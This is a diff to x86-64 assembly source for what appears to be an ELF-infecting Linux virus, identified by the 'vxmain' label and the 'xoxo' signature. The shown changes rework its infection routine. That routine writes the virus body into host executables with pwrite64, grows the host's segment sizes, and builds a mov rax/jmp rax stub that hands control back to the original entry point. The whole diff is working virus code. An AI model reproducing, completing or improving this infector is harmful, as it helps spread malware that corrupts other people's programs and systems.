@@ -324,13 +324,19 @@ BITS 64
 ;
 ;PAGESIZE dd 4096	
 ;****************************************************************************************
-;%define vlen equ vend - vxmain
-global vxmain
+;%define vlen equ vend - _start
+global _start
 default rel
 section .text
-vxmain:
-	jmp vxstart
+_start:
+	;jmp vxstart
+	lea rax, [rel vxstart]
+	jmp rax
 	vxsig: db "xoxo",0
+test:
+	lea rax, [vxstart]
+	jmp rax
+
 vxstart:
 	push rbp
 	mov rbp, rsp
@@ -670,8 +676,8 @@ infect:
 					mov r10, [r13 + r12 + 8]			; elf_phdr.p_offset  
 					add r10, [r13 + r12 + 32]			; elf_phdr.p_filesz offset
 					mov dword [r14 + 436], r10d
-					add qword [r13 + r12 + 32], vlen+6	;elf_phdr.p_filesz offset
-					add qword [r13 + r12 + 40], vlen+6	;elf_phdr.p_memsz offset
+					add qword [r13 + r12 + 32], vlen+12	;elf_phdr.p_filesz offset
+					add qword [r13 + r12 + 40], vlen+12	;elf_phdr.p_memsz offset
 					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
 				xor r11, r11
@@ -835,7 +841,7 @@ frankenstein_elf:
 			sub rax, .delta
 		mov rdi, r9
 		mov rdx, vlen
-		lea rsi, [rax + vxmain]
+		lea rsi, [rax + _start]
 		mov r10d, dword [r14 + 436]
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
@@ -843,10 +849,25 @@ frankenstein_elf:
 	.write_jmp_to_oep:
 		xor r11, r11
 		mov r11, qword [r14 + 448]
-		mov rdx, 6
-		mov byte [r14 + 150], 0x68			;0x68 = push
-		mov dword [r14 + 151], r11d			;address of original host entry point
-		mov byte [r14 + 155], 0xc3			;0xc3 = ret
+		mov rdx, 12
+		mov byte [r14 + 150], 0x48			;0x488d05 = lea rax
+		;mov byte [r14 + 151], 0x8d			
+		mov byte [r14 + 151], 0xb8			
+		;mov byte [r14 + 152], 0x84			
+		;mov byte [r14 + 153], 0x24			
+		;mov byte [r14 + 154], 0xC0			
+		;mov byte [r14 + 155], 0x01			
+		;mov byte [r14 + 156], 0x00			
+		;mov byte [r14 + 152], 0x05			
+		;mov byte [r14 + 152], 0x05			
+		;mov byte [r14 + 153], 0x60			
+		mov qword [r14 + 152], r11			;address of original host entry point
+		;mov byte [r14 + 157], 0x00			;0xff 0xe0 = jump eax
+		mov byte [r14 + 160], 0xff			;0xff 0xe0 = jump eax
+		mov byte [r14 + 161], 0xe0			;0xff 0xe0 = jump eax
+		;mov byte [r14 + 150], 0x68			;0x68 = push
+		;mov dword [r14 + 151], r11d			;address of original host entry point
+		;mov byte [r14 + 155], 0xc3			;0xc3 = ret
 		lea rsi, [r14+ 150]
 		mov r10d, dword [r14 + 436]
 		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
@@ -926,7 +947,9 @@ frankenstein_elf:
 		syscall
 fin_infect:
 	ret
-
+jmp_to_oep:
+	mov rax, [rsp + 448]
+	jmp rax
 PAGESIZE: dd 4096	
 ;;restore stack to original state
 _restore:
@@ -934,7 +957,7 @@ _restore:
 	mov rsp, rbp
 	pop rbp
 
-vlen equ $-vxmain
+vlen equ $-_start
 vend:
 _end:
 	xor rdi, rdi
